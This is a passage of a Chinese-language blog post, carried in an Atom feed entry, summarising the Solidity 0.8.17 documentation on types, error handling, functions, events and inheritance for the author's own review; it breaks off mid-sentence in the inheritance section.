    <link href="https://alphafitz.com/2022/10/19/solidity-docs-0-8-17-notes/"/>
    <id>https://alphafitz.com/2022/10/19/solidity-docs-0-8-17-notes/</id>
    <published>2022-10-19T10:06:42.000Z</published>
    <updated>2022-10-25T09:45:26.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Solidity-文档-0-8-17-笔记"><a href="#Solidity-文档-0-8-17-笔记" class="headerlink" title="Solidity 文档 0.8.17 笔记"></a>Solidity 文档 0.8.17 笔记</h1><blockquote><p>本文是本人对 Solidity 0.8.17 文档的笔记，基本语法复习自用。</p></blockquote><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="Value-Types"><a href="#Value-Types" class="headerlink" title="Value Types"></a>Value Types</h3><p>值类型永远通过值传递（赋值或作为函数参数）。</p><p><code>address</code> 类型可以和 <code>uint160</code>、整数字面量、<code>bytes20</code> 和合约类型相互转换。但只有 <code>address</code> 和合约类型可以通过显式类型转换 <code>payable(&lt;address&gt;)</code> 转换为 <code>address payable</code> 类型。对于合约类型，只有合约能够接收以太时转换才被允许。</p><p>长字节类型强制类型转换为短字节类型时，会从高位开始取；长整数型强制类型转换为短整数型时，会从低位开始取。</p><p>每一个合约都定义了它们自己的类型。您可以将合约隐式转换为它们继承的合约。合约可以显式转换为地址类型或从地址类型转换。如果你声明了一个合约类型的局部变量，你就能调用该合约上的函数。您也可以实例化合约（使用 <code>new</code> 创建新的合约）。合约类型的成员是其外部函数。</p><p>函数类型也是值类型的一种，分为 <code>internal</code> 或 <code>external</code> 两种。函数可以作为参数或返回值来使用，因为其也是值类型的一种。具体用法和注意点可以查看 <a href="https://docs.soliditylang.org/en/latest/types.html#function-types">Types — function types</a>。</p><h3 id="Reference-Types"><a href="#Reference-Types" class="headerlink" title="Reference Types"></a>Reference Types</h3><p>引用类型的值可以通过多个不同的名字更改。因此引用类型必须比值类型更加小心地处理。一般，引用类型包括结构体、数组和映射。如果使用引用类型，必须显式地提供数据存储位置：<code>memory</code>（生命周期限制为外部函数调用）、<code>storage</code>（状态变量存储的位置，生命周期限制为合约的声明周期）或 <code>calldata</code>（包含函数参数的特殊数据位置）。<code>calldata</code> 是存储函数参数的不可修改、非持久性区域，行为主要类似于内存。</p><p>更改数据位置的赋值或类型转换将始终引发自动复制操作，而同一数据位置内的赋值仅在某些情况下为存储(storage)类型进行复制。如果可以请尽量使用 <code>calldata</code> 因为会避免复制，也会确保数据不会被修改。</p><p>赋值行为：</p><ul><li><code>storage</code> 和 <code>memory</code>（或从 <code>calldata</code>）之间的赋值始终会创建单独的拷贝；</li><li>从 <code>memory</code> 到 <code>memory</code> 只创建引用；</li><li>从 <code>storage</code> 到 局部(local)存储变量也只分配引用；</li><li>所有其他的到 <code>storage</code> 的赋值都会拷贝，比如到状态变量或到局部存储结构体类型的成员的赋值，即使局部变量本身只是个引用；</li></ul><p>数组可以有编译时固定大小，或有动态大小。固定大小数组表示为 <code>T[k]</code>，动态数组表示为 <code>T[]</code>。例如 5 个 <code>uint</code> 的动态数组的数组表示为 <code>uint[][5]</code>，语法类似 <code>uint[][5] memory x;</code>。数组元素可以是任何类型，包括映射或结构体。类型的一般限制为，映射只能存储在 <code>storage</code> 位置，公共可见的函数需要 ABI 类型的参数。</p><p><code>bytes</code> 和 <code>string</code> 分别是字节动态数组和 UTF-8 编码的动态字节数组。<code>bytes</code> 可以和其他动态数组类型一样，有成员变量 <code>length</code> 和成员函数：<code>push()</code>、<code>push(x)</code> 和 <code>pop()</code>。但 <code>string</code> 没有这四个成员，而只能通过赋值来改变值 <code>s = &#39;xxx&#39;</code>。但由于是动态的，因此可以赋任意长度的字符串。</p><p><code>bytes</code> 和 <code>string</code> 类型变量是特殊的数组。<code>string</code> 和 <code>bytes</code> 相等但不允许长度或下标索引。可以通过 keccak256 哈希来判断两个 <code>string</code> 是否相等：<code>keccak256(abi.encodePacked(s1)) == keccak256(abi.encodePacked(s2))</code>，也可以把两个字符串连在一起：<code>string.concat(s1, s2)</code>。</p><p>作为基本规则，请将 <code>bytes</code> 用于任意长度的原始字节数据，将 <code>string</code> 用作任意长度的字符串 (UTF-8) 数据。如果你将长度限制为固定的字节个数，应该使用 <code>bytes1</code> 至 <code>bytes32</code>。使用 <code>bytes(s).length</code> 和 <code>bytes(s)[7] = &#39;x&#39;;</code> 的方式可以以单个字节的形式访问字符串。要使用 <code>string.concat</code> 应将参数都转换为 <code>string</code> 类型，要使用 <code>bytes.concat</code> 应将参数都转换为 <code>bytes</code> 或 <code>bytes1/.../bytes32</code> 类型。</p><p>动态长度的内存数组可以使用 <code>new</code> 运算符创建。与存储数组不同，内存数组不能重新组织大小（<code>.push</code> 成员不能使用）。要么必须提前计算所需的大小，要么创建一个新的内存数组并复制每个元素。<code>uint[] memory a = new uint[](7);</code> 或 <code>bytes memory b = new bytes(len);</code>。</p><p>数组字面量始终是静态大小的内存数组，其长度是表达式的个数。数组的基本类型是第一个表达式的类型，后面的表达式都会隐式转换为该类型，如果不能就会产生类型错误。固定大小内存数组不能分配给动态大小的内存数组。如果想要初始化动态大小数组，必须分配给每个单独的元素。</p><p>尽量注意避免存储数组元素的悬浮引用。每个语句只分配一次存储总是更安全，并且避免在分配的左侧使用复杂的表达式。</p><p>数组切片写作 <code>x[start:end]</code>，没有任何成员，可以隐式转换为其基础类型的数组并支持索引访问。索引访问在底层数组中不是绝对的，而是相对于切片的开头。到目前为止，数组切片仅针对 <code>calldata</code> 数组实现。</p><p>在所有函数中，结构体类型被分配为 <code>storage</code> 数据位置的局部变量。这不会复制一个结构体，而只会存储一个引用，以便对局部变量的成员的赋值实际写入状态。</p><h3 id="Mapping-Types"><a href="#Mapping-Types" class="headerlink" title="Mapping Types"></a>Mapping Types</h3><p>映射类型使用 <code>mapping(KeyType =&gt; ValueType) VariableName</code> 来声明。其中，<code>KeyType</code> 可以是任何内置值类型，<code>bytes</code>，<code>string</code> 或任何合约或枚举类型，<code>ValueType</code> 可以是任何类型。映射只能存储在 <code>storage</code>，用于状态变量，作为函数的存储引用类型，或作为库函数的参数。不能用作公共可见的合约函数的参数或返回参数。不能对映射进行迭代，即不能枚举它们的键。但是可以在它们之上实现一个数据结构并对其进行迭代。</p><p><code>delete a</code> 可以为 <code>a</code> 分配该类型的初始值。对于结构体，它为结构体的所有成员分配初始值。但 <code>delete</code> 不会对映射产生影响（因为映射的键通常是任意的且不可知）。</p><h2 id="表达式和控制结构"><a href="#表达式和控制结构" class="headerlink" title="表达式和控制结构"></a>表达式和控制结构</h2><p>大括号语言中的大多数控制结构在 Solidity 中都是有的：<code>if</code>、<code>else</code>、<code>while</code>、<code>do</code>、<code>for</code>、<code>break</code>、<code>continue</code>、<code>return</code>，并且有着 C 或 JavaScript 中的通用语义。</p><p>Solidity 使用 <code>try</code> &#x2F; <code>catch</code> 语句用作异常处理，但仅能用于外部函数调用和合约创建调用。 Error 可以使用 <code>revert</code> 语句创建。</p><p>条件句不能省略括号，但单语句体周围的花括号可以省略。</p><p>布尔类型和非布尔类型不能进行类型转换。</p><h3 id="Function-Calls"><a href="#Function-Calls" class="headerlink" title="Function Calls"></a>Function Calls</h3><p>内部函数调用被翻译为 EVM 中的简单跳转。当前内存不会被清空，传入内存引用很高效。内部函数调用也应该避免过度递归，因为每一个内部函数调用使用至少一个栈槽，而且仅有 1024 个可用的栈槽。</p><p>外部函数调用可以使用 <code>this.g(8);</code> 和 <code>c.g(2)</code> 的表达方式，<code>c</code> 是合约实例。外部函数调用使用的是消息调用(message call)而不是直接跳转。对于外部调用，所有的函数参数必须拷贝到内存中。这里的消息调用是整体交易中的一部分，不会创建自己的交易。</p><p>当调用其他合约的函数时，你可以使用特殊的选项指定发送的金额和提供的 gas：<code>&#123;value: 10, gas: 10000&#125;</code>。不鼓励明确指定 gas 值，因为操作码的 gas 费用可能会在未来发生变化。您发送给合约的任何金额都会添加到该合约的总余额中。如果你想发送金额，需要使用 <code>payable</code> 标识被调用的合约函数。</p><p>EVM 认为对不存在的合约的调用总是成功的，Solidity 使用 <code>extcodesize</code> 操作码来检查即将被调用的合约是否确实存在（包含代码），如果不存在则触发异常。如果返回数据将在调用后被解码，则跳过此检查，因此 ABI 编码器将捕获不存在合约的情况。对于地址而不是合约实例的低级调用，检查不会进行。</p><p>与另一个合约的任何交互都会带来潜在的危险，特别是如果事先不知道合约的源代码。当前的合约将控制权移交给被调用的合约，这可能会发生任何事情。</p><p>函数调用时参数可以使用 <code>&#123;&#125;</code> 指定。函数声明中的参数和返回值的名称可以省略。这些省略名称的项仍将出现在堆栈中，但无法通过名称访问。</p><h3 id="Creating-Contracts-via-new"><a href="#Creating-Contracts-via-new" class="headerlink" title="Creating Contracts via new"></a>Creating Contracts via <code>new</code></h3><p>一个合约可以使用 <code>new</code> 关键字创建其他合约。在编译创建合约时，必须知道正在创建的合约的完整代码，因此递归创建依赖项是不可能的。创建合约时可以使用 <code>&#123;value: amount&#125;</code> 发送以太。创建失败则抛出异常。</p><p>此处创建合约时，合约的地址是根据创建合约的地址和随着每次合约创建而增加的计数器计算出来的。如果指定了选项 <code>salt</code>（bytes32 value），则合约创建会使用不同的机制生成新合约的地址。会使用创建合约的地址、给定的 salt 值、创建合约的（创建）字节码和构造函数参数来计算地址，不再使用计数器（”nonce”）。因此可以在创建新合约之前获取其地址，以防止创建合约同时创建其他合约。</p><h3 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h3><p>Solidity 内部允许元组类型。元组不是 Solidity 的合适类型，它们仅能被用于表达式的句法分组。不能混合变量声明和非声明赋值。在涉及引用类型时同时分配多个变量时要小心，因为可能导致意外的复制行为。</p><p>数组、结构体（包括 <code>bytes</code> 和 <code>string</code>）的赋值语义更加复杂。具体参考前面引用类型的赋值行为。</p><h3 id="Scoping-and-Declarations"><a href="#Scoping-and-Declarations" class="headerlink" title="Scoping and Declarations"></a>Scoping and Declarations</h3><p>Solidity 中的作用域遵循 C99 的广泛作用域规则。变量从声明之后的那一位置到包含声明的最小 <code>&#123; &#125;</code> 块的末尾都是可见的。一个例外是 for 循环的初始化部分中声明的变量仅在 for 循环结束之前可见。类似参数的变量（函数参数、修饰符参数、catch 参数等）在后面的代码块中可见。在代码块之外声明的变量和其他项目，例如函数、合约、用户定义的类型等，甚至在声明之前就可见。</p><h3 id="Checked-or-Unchecked-Arithmetic"><a href="#Checked-or-Unchecked-Arithmetic" class="headerlink" title="Checked or Unchecked Arithmetic"></a>Checked or Unchecked Arithmetic</h3><p>在 Solidity 0.8.0 之前，算术运算总是会在上溢或下溢的情况下进行 wrap，从而导致广泛地使用引入额外检查的库。从 Solidity 0.8.0 开始，所有的算术运算将会默认地在上溢或下溢时 revert，而不再需要这些库。</p><p>位运算符不执行上溢或下溢检查。同样在用按位移位代替整数乘除法时尤其明显。</p><h3 id="Error-handling-Assert-Require-Revert-and-Exception"><a href="#Error-handling-Assert-Require-Revert-and-Exception" class="headerlink" title="Error handling: Assert, Require, Revert and Exception"></a>Error handling: Assert, Require, Revert and Exception</h3><p>Solidity 使用状态回滚异常(state-reverting exception)来处理错误。这样的异常会撤销对当前调用（及其所有子调用）中状态所做的所有更改，并向调用者标记错误。当子调用发生异常，它们会“冒泡”，除非被 <code>try/catch</code> 语句捕获。此规则的例外是 <code>send</code> 和低级函数调用 <code>call</code>、<code>delegatecall</code> 和 <code>staticcall</code>：它们返回 <code>false</code> 作为它们的第一个返回值，以防出现异常而不是“冒泡”。注意，如果调用的账户不存在，这三个低级调用会返回 <code>true</code>。因此需要在调用前检查账户是否存在。异常可以包含以错误实例的形式传回调用者的错误数据。</p><p><code>assert</code> 和 <code>require</code> 可用于检查条件，如果条件不满足则抛出异常。<code>assert</code> 函数会创建一个 <code>Panic(uint256)</code> 类型的错误。在某些情况下，编译器会创建相同的错误。</p><p>Assert 只应该用于测试内部错误和检查不变量。正常运行的代码不应该创建 Panic，即使是在无效的外部输入上也是如此。<a href="https://docs.soliditylang.org/en/latest/control-structures.html#panic-via-assert-and-error-via-require">Expressions and Control Structures — Error handling</a> 给出了 Panic 的错误代码。</p><p><code>require</code> 函数要么创建一个没有任何数据的错误，要么创建一个 <code>Error(string)</code> 类型的错误。应该用于确保在执行之前无法检测到的有效条件，包括对于外部合约调用的输入或返回值的条件。目前无法将自定义错误与 <code>require</code> 结合使用，应该使用 <code>if (!condition) revert CustomError();</code>。</p><p>发生 <code>Error(string)</code> 异常和无数据异常的条件：</p><ol><li><code>require(x)</code> 中 <code>x</code> 等于 <code>false</code>；</li><li><code>revert()</code> 或 <code>revert(&quot;description&quot;)</code>；</li><li>外部函数调用目标合约没有代码；</li><li>通过没有 <code>payable</code> 修饰符的公共函数接收以太币；</li><li>合约通过公共 getter 函数接收以太币。</li></ol><p>以下情况将转发来自外部调用（如果提供）的错误数据。这意味着它可能会导致 Error 或 Panic（或给出的任何其他内容）：</p><ol><li><code>.transfer()</code> 失败；</li><li>通过消息调用(message call)调用一个函数但没有正确完成（out of gas，没有匹配的函数，或自身抛出异常）（除了低级操作 <code>call</code>、<code>send</code>、<code>delegatecall</code> 或 <code>staticcall</code> 的情况）；</li><li>使用 <code>new</code> 创建合约，但合约创建未正确完成。</li></ol><p>使用 <code>revert</code> 语句和 <code>revert</code> 函数将触发直接回滚。<code>revert</code> 语句以通用错误作为直接参数：<code>revert CustomError(arg1, arg2);</code>。出于向后兼容的原因，还有 <code>revert()</code> 函数，使用括号并接受字符串：<code>revert();</code> 或 <code>revert(&quot;description&quot;);</code>。</p><p>错误数据将会被传递回调用者，并且可以在那里被捕获。使用 <code>revert()</code> 会导致没有任何错误数据的回滚，而 <code>revert(&quot;description&quot;)</code> 将会创建 <code>Error(string)</code> 错误。使用自定义错误实例通常会比字符串描述便宜得多，因为您可以使用错误名称来描述它，它仅编码为四个字节。可以通过 NatSpec 提供更长的描述，这不会产生任何费用。</p><p>只要 <code>revert</code> 和 <code>require</code> 的参数没有副作用，两种方式 <code>if (!condition) revert(...);</code> 和 <code>require(condition, ...)</code> 就是相等的。<code>require</code> 函数在执行函数之前评估所有参数，也就是说即使 <code>require(condition, f())</code> 中的 <code>condition</code> 为真，<code>f</code> 函数也会被执行。</p><p>调用者可以使用 <code>try</code> &#x2F; <code>catch</code> 检错提供的消息，应对这些失败，但被调用者的更改将被回滚。具体使用示例见 <a href="https://docs.soliditylang.org/en/latest/control-structures.html#try-catch">Expressions and Control Structures — try&#x2F;catch</a>。<code>try</code> 关键字后面必须跟一个表示外部函数调用或合约创建的表达式(<code>new ContractName()</code>)。表达式内部的错误不会被捕获，只会在外部调用本身内部发生回滚。后面的返回部分（可选）声明了与外部调用返回的类型匹配的返回变量。如果没有错误，则分配这些变量，并且合约的执行在第一个成功块内继续。如果到达成功块的末尾，则在 catch 块之后继续执行。Solidity 根据错误类型支持不同类型的 catch 块：</p><ol><li><code>catch Error(string memory reason) &#123; ... &#125;</code>：<code>require(&quot;reason&quot;)</code> 或 <code>require(false, &quot;reason&quot;)</code> 引起的错误；</li><li><code>catch Panic(uint errorCode) &#123; ... &#125;</code>：panic 引起的错误；</li><li><code>catch (bytes memory lowLevelData) &#123; ... &#125;</code>：如果错误签名与任何其他子句不匹配，如果在解码错误消息时出现错误，或者如果没有提供错误数据和异常，则执行此子句。在这种情况下，声明的变量提供对低级错误数据的访问；</li><li><code>catch &#123; ... &#125;</code>：对错误数据不感兴趣，可以只使用 <code>catch &#123; ... &#125;</code>（甚至作为唯一的 catch 子句）。</li></ol><p>为了捕获所有错误情况，您必须至少有子句 <code>catch &#123; ...&#125;</code> 或子句 <code>catch (bytes memory lowLevelData) &#123; ... &#125;</code>。</p><h2 id="合约"><a href="#合约" class="headerlink" title="合约"></a>合约</h2><p>Solidity 中的 contract 和面向对象语言中的 class 相似。</p><h3 id="Creating-Contracts"><a href="#Creating-Contracts" class="headerlink" title="Creating Contracts"></a>Creating Contracts</h3><p>合约可以通过交易从外部创建，也可以从合约创建。合约被创建时，其构造函数被执行一次。具体的创建过程可以参考 <a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 — 智能合约创建过程</a>。构造函数可选，但最多只能有一个，即不支持重载。部署代码不包含构造函数以及仅被构造函数调用的内部函数。构造函数参数在合约代码之后以 ABI 编码的方式被传递。</p><p>如果一个合约想要创建另一个合约，那么被创建合约的源码（或二进制）必须被创建者所知。</p><h3 id="Visibility-and-Getters"><a href="#Visibility-and-Getters" class="headerlink" title="Visibility and Getters"></a>Visibility and Getters</h3><p>状态变量可见性包括：<code>public</code>(内部访问直接访问存储，外部访问通过消息调用)、<code>internal</code>(状态变量的默认可见级别)、<code>private</code>。</p><p>Solidity 有两种函数调用：EVM 消息调用和内部(跳转)，有四种函数可见性：<code>external</code>(合约接口的一部分，消息调用)、<code>public</code>(合约接口的一部分，消息调用或内部)、<code>internal</code>(内部，且能够接收映射或存储的引用)、<code>private</code>(与<code>internal</code>相似但对于派生合约不可见)。</p><p>编译器自动为所有公共状态变量创建 getter 函数，自动创建的 getter 函数和变量同名，是否有参数以及参数类型依赖于变量类型。在合约内部也可以使用外部调用的方式访问变量 <code>data</code>：<code>this.data()</code>。对于数组，getter 函数检索数组的单个元素，可以使用参数指定要返回的单个元素。你也可以用函数返回整个数组，例如：<code>function getArray public view returns (uint[] memory) &#123; return myArray; &#125;</code>。</p><h3 id="Function-Modifiers"><a href="#Function-Modifiers" class="headerlink" title="Function Modifiers"></a>Function Modifiers</h3><p>修饰符可用于以声明的方式更改函数的行为。修饰符是可继承的合约属性，可能被派生的合约覆盖，但需要将其标记为 <code>virtual</code>。</p><p>如果想要访问合约 <code>C</code> 中的修饰符 <code>m</code>，可以使用 <code>C.m</code> 来引用它而无需虚拟查找。只能使用当前合约或其基合约中定义的修饰符。修饰符也可以在库中定义，但它们的使用仅限于相同库的函数。</p><p>可以将多个修饰符应用于函数，并按显示的顺序进行评估。</p><p>修饰符不能隐式访问或更改它们修饰的函数的参数和返回值。它们的值只能在调用时显示传递给它们。</p><p>修饰符内，占位符 <code>_</code> 用于表示应在何处插入被修饰函数的主体。<code>_</code> 可以多次出现在修饰符中，每次出现都替换为函数体。从修饰符或函数体显式返回仅返回当前修饰符或函数体。返回变量被分配，控制流在修饰符中的 <code>_</code> 之后继续。即如果修饰符 <code>_</code> 之后仍有语句，那么即使函数已经返回，这些语句也会在函数返回之后继续执行。</p><p>带有 <code>return;</code> 的修饰符的显式返回并不影响函数返回的值。修饰符可以选择根本不执行函数体，在这种情况下，返回变量被设置为它们的默认值，就像函数有一个空的函数体一样。</p><p>修饰符参数允许使用任意表达式，在这种情况下，从函数中可见的所有符号在修饰符中都是可见的。修饰符中引入的符号在函数中不可见（因为它们可能会因覆盖而改变）。</p><h3 id="Constant-and-Immutable-State-Variables"><a href="#Constant-and-Immutable-State-Variables" class="headerlink" title="Constant and Immutable State Variables"></a>Constant and Immutable State Variables</h3><p>状态变量可以声明为 <code>constant</code> 或 <code>immutable</code>。<code>constant</code> 变量的值需要在编译时确定，但 <code>immutable</code> 变量的值可以在构造时分配。也可以在文件级别定义 <code>constant</code> 变量。编译器不会为这些变量保留存储槽，每次出现都会被相应的值替换。编译器生成的合约创建代码将在返回之前修改合约的运行时代码，方法是将所有对不可变对象的引用替换为分配给它们的值。</p><p>常量和不可变变量的 gas 要比常规状态变量低得多。目前支持的常量类型有 <code>string</code> 和值类型，支持的不可变变量只有值类型。</p><p>对于 <code>constant</code> 变量，该值在编译时必须是一个常量，并且必须在声明变量的地方赋值。任何访问存储、区块链数据或执行数据或调用外部合约的表达式都是不允许的。不可变变量可以在合约的构造函数中或在它们声明时被分配一个任意值，且只能分配一次。</p><h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><p>函数将类型化参数(typed parameters)作为输入，还可以返回任意数量的值作为输出。</p><p>函数参数的声明方式与变量相同，未使用的参数名称可以省略。函数参数可以用作任何其他局部变量，也可以分配给它们。</p><p>返回值在 <code>return</code> 关键词后使用相同的语法声明。返回变量的名称可以省略。返回变量可以用作任何其他局部变量，并使用其默认值初始化并具有该值，直到它们被（重新）分配。可以显式分配给返回变量的名称，或者可以直接使用 <code>return</code> 语句提供返回值（单个或多个）：<code>return (a + b, a * b);</code>。当返回多个返回值时，接收组件的数量和类型必须与返回变量的相同（可以是在隐式转换后）。</p><p>声明为 <code>view</code> 的函数承诺不修改状态。声明为 <code>pure</code> 的函数承诺不会读取或修改状态。纯函数能够使用 <code>revert()</code> 和 <code>require()</code> 函数在发生错误时恢复潜在的状态更改。回滚状态更改不被视为“状态修改”。</p><p>一个合约最多有一个 <code>receive</code>  函数：<code>receive() external payable &#123; ... &#125;</code>（没有参数，不能返回任何数据，必须是 <code>external</code> 和 <code>payable</code> 的）。可以是 virtual 的，可以 override，也可以有修饰符。在 calldata 为空的合约调用时被执行。如果没有 <code>receive</code> 但是有 <code>payable</code>  的 <code>fallback</code> 函数，则会执行 <code>fallback</code> 函数。如果都没有，那么合约就不能接收以太，就会抛出异常。</p><p>如果使用 <code>send</code>  或 <code>transfer</code>，那么 <code>receive</code> 函数只有 2300 gas 可用，只能进行一些基本逻辑操作。以下操作都会花费超过 2300 gas：</p><ul><li>写入到存储</li><li>创建合约</li><li>花费大量 gas 调用外部函数</li><li>发送以太</li></ul><p>没有接收以太功能的合约可以接收以太作为矿工块奖励或作为 <code>selfdestruct</code> 函数的目的地。合约无法对此类以太币转账做出反应，因此也无法拒绝它们。这也意味着 <code>address(this).balance</code> 可能高于在合约中实现的一些手动记账的总和（比如在接收以太的函数中更新一个计数器）。</p><p>一个合约最多有一个 <code>fallback</code> 函数，使用 <code>fallback () external [payable]</code> 或 <code>fallback (bytes calldata input) external [payable] returns (bytes memory output)</code> 进行声明。可以是 virtual 的，可以 override，也可以有修饰符。除了上面的场景，<code>fallback</code> 还在 calldata 中的函数签名没有成功匹配的情况下执行。如果使用了带参数的版本，<code>input</code> 将包含发送到合约的完整数据（等于 <code>msg.data</code>），并且可以在 <code>output</code> 中返回数据。返回的数据不会经过 ABI 编码。相反，它将在没有修改的情况下返回（甚至不会填充）。与任何函数一样，只要有足够的 gas 传递给它就可以执行复杂的操作。但对于替代 <code>receive</code> 的应用中，只有 2300 gas 可用。</p><p>如果想要解码输入数据，可以检查函数选择器的前四个字节，然后使用 <code>abi.decode</code> 和数组切片语法来解码 ABI 编码的数据：<code>(c, d) = abi.decode(input[4:], (uint256, uint256));</code>。请注意这仅应作为最后的手段，应该使用适当的函数。</p><p>一个合约可以有多个同名但是参数类型不同的函数，即函数可以“重载(overload)”，并且也适用于继承的函数。外部接口也存在重载函数。</p><p>通过将当前作用域中的函数声明与函数调用中提供的参数匹配来选择重载函数。如果所有参数都可以隐式转换为预期类型，则选择函数作为重载候选者。重载解析不考虑返回参数。</p><h3 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h3><p>Solidity 事件在 EVM 的日志记录功能之上提供了一个抽象。应用程序可以通过以太坊客户端的 RPC 接口订阅和监听这些事件。</p><p>事件是合约的可继承成员。事件的数据被存储在交易日志中。这些日志与合约地址相关联，并在区块可访问时一直存在。</p><p>一个日志最多可以添加 3 个 <code>indexed</code> 属性到参数上，这会将其添加到 “topics” 的数据结构中，而不是日志的数据部分。一个 topic 只能包含单个字（32 字节），如果是索引参数则会取该值的 Keccak256 哈希。在记录的日志中无法通过该哈希恢复原数据。在使用日志代替存储的场景下应注意这一点。所有没有 <code>indexed</code> 属性的参数都被 ABI 编码到日志的数据部分。 </p><p> Topic 允许搜索事件，比如为某些事件过滤一系列的块，还可以按发出事件的合约地址过滤事件。事件签名的哈希也是 topic 之一，除非使用 <code>anonymous</code> 说明符声明事件。这意味着无法按照名称过滤该匿名事件而只能按照合约地址过滤。匿名事件优点是部署和调用成本更低。此外还允许声明 4 个 indexed 参数。</p><p>事件的成员：<code>event.selector</code>，对于非匿名事件，这是一个包含事件签名的 <code>keccak256</code> 哈希的 <code>bytes32</code> 值。</p><h3 id="Errors-and-the-Revert-Statement"><a href="#Errors-and-the-Revert-Statement" class="headerlink" title="Errors and the Revert Statement"></a>Errors and the Revert Statement</h3><p>Solidity 中的错误(Error)提供了一种方便高效的方式向用户解释操作失败的原因。它们可以在合约内部和外部（包括接口和库）定义。它们必须与 <code>revert</code> 语句一起使用，这会导致当前调用中的所有更改都被还原并将错误数据传递回调用者。</p><p>Error 不能被重载(overload)或覆盖(override)，而是被继承(inherit)。只要范围不同，就可以在多个地方定义相同的错误。错误实例只能使用 <code>revert</code> 语句创建。</p><p>该错误创建的数据随后通过 revert 操作传递给调用者，以返回到链外组件或在 <code>try/catch</code> 语句中捕获它。请注意，错误只能在来自外部调用时被捕获，在内部调用或同一函数内部发生的还原无法被捕获。</p><p>如果不提供任何参数，则错误只需要四个字节的数据，您可以使用 NatSpec 进一步解释错误背后的原因，它没有存储在链上。这使得它同时成为一个非常便宜和方便的错误报告功能。</p><p>更具体地说，错误实例以与对相同名称和类型的函数的相同的函数调用方式进行 ABI 编码，然后将其用作还原操作码中的返回数据。这意味着数据包含一个 4 字节选择器，后跟 ABI 编码数据。选择器由错误类型签名的 keccak256 哈希的前四个字节组成。</p><p>如果你定义了 <code>error Error(string)</code>，那么语句 <code>require(condition, &quot;description&quot;);</code> 与 <code>if (!condition) revert Error(&quot;description&quot;)</code> 相同。</p><p>Error 的成员：<code>error.selector</code>，一个包含错误选择器的 <code>bytes4</code> 类型的值。</p><h3 id="Inheritance"><a href="#Inheritance" class="headerlink" title="Inheritance"></a>Inheritance</h3><p>Solidity 支持多重继承，包括多态性。多态性意味着函数调用（内部和外部）总是在继承层次结构中最派生的合约中执行相同名称（和参数类型）的函数。这必须使用 <code>virtual</code> 和 <code>override</code> 关键字在层次结构中的每个函数上显示启用。</p><p>可以通过使用 <code>ContractName.functionName()</code> 或使用 <code>super.functionName()</code> 在内部继承层次结构中显式指定合约以进一步调用函数。</p><p>当一个合约继承自其他合约时，区块链上只创建一个合约，所有基础合约的代码都编译到创建的合约中。这意味着对基础合约函数的所有内部调用也只使用内部函数调用（<code>super.f(...)</code> 将使用 JUMP 而不是消息调用）。</p><p>状态变量遮盖(shadowing)被视为错误。如果在其任何基合约中都没有同名的可见状态变量，派生合约只能声明状态变量 <code>x</code>。</p><p>如果在继承合约中调用 <code>super</code> 的函数，它会在最终继承图中的下一个基础合约上调用此函数。使用 <code>super</code> 时调用的实际函数在使用它的类的上下文中是未知的，尽管它的类型是已知的。这与普通的 virtual 方法查找类似。</p><p>如果基函数被标记为 <code>virtual</code>，则可以通过继承合约更改它们的行为来覆盖基函数。然后，覆盖函数必须在函数头中使用 <code>override</code> 关键字。覆盖函数只能将覆盖函数的可见性从 <code>external</code> 更改为 <code>public</code>。可变性可以更改为更严格的顺序：<code>nonpayable</code> 可以被 <code>view</code> 和 <code>pure</code> 覆盖。<code>view</code> 可以被 <code>pure</code> 覆盖。<code>payable</code> 是一个例外，不能更改为任何其他可变性。</p><p>对于多重继承，必须在 <code>override</code> 关键字之后显式指定定义相同函数的最派生基合约。换句话说，必须指定所有定义相同函数且尚未被另一个基合约覆盖的基合约（在通过继承图的某个路径上）。此外，如果合约从多个（不相关的）基继承相同的函数，必须显式覆盖它。如果函数是在通用基合约中定义的，或者如果通用基合约中有一个唯一函数已经覆盖了所有其他函数，则不需要显式覆盖说明符。</p><p>更正式地说，如果有一个基合约是签名的所有覆盖路径的一部分，则不需要覆盖从多个基（直接或间接）继承的函数，并且 (1) 该基实现了该函数，并且从当前合约到基的路径没有提到具有该签名的函数，或者 (2) 该基没有实现该函数，并且在所有路径中至多提及该函数当前与该基的合约。从这个意义上说，签名的覆盖路径是通过继承图的路径，该路径从所考虑的合约开始，到提及具有该签名的未覆盖函数的合约结束。</p><p>如果不将函数标记为 <code>virtual</code>，那么派生合约不能改变合约的行为。从 Solidity 0.8.8 开始，覆盖接口函数时不需要 <code>override</code> 关键字，除非函数在多个基中定义。</p><p>如果函数的参数和返回类型与变量的 <code>getter</code> 函数匹配，则公共状态变量可以覆盖外部函数。</p><p>函数修饰符可以像函数一样覆盖。同样地，被覆盖的修饰符用 <code>virtual</code> 关键字，覆盖的修饰符用 <code>override</code> 关键字。在多重继承中，所有的直接基合约必须显式声明。</p><p>构造函数是可选的，会在合约创建时执行，可以运行合约初始化代码。在执行构造函数代码之前，如果内联初始化状态变量，则将其初始化为指定值，否则将其初始化为默认值。在构造函数运行后，合约的最终代码就被部署到区块链上。</p><p>可以在构造函数中使用内部参数（如存储指针）。在这种情况下，必须将合约标记为 <code>abstract</code>，因为这些参数不能从外部分配有效值，而只能通过派生合约的构造函数分配。</p><p>所有基合约的构造函数都将按照合约继承的线性化规则进行调用。如果基构造函数有参数，则派生合约需要指定所有参数。一种方法是直接在继承列表中，另一种是作为派生构造函数的一部分调用修饰符的方式。如果构造函数参数是一个常量并定义合约的行为或描述它，则第一种方法会更方便。如果基的构造函数参数依赖于派生合约的参数，则必须使用第二种方法。参数必须在继承列表或派生构造函数的修饰符样式中给出。</p><p>如果派生合约没有为其所有基合约的构造函数指定参数，则必须将其声明为 <code>abstract</code>。在这种情况下，当另一个合约派生自它时，该其他合约的继承列表或构造函数必须为所有未指定其参数的基类提供必要的参数（否则，该其他合约也必须声明为 <code>abstract</code>）。</p><p>在 Solidity 中，继承中的 <code>is</code>  指令给出基类的顺序很重要：必须按照从 “most base-like” 到 “most derived” 的顺序列出直接基合约。请注意，此顺序与 Python 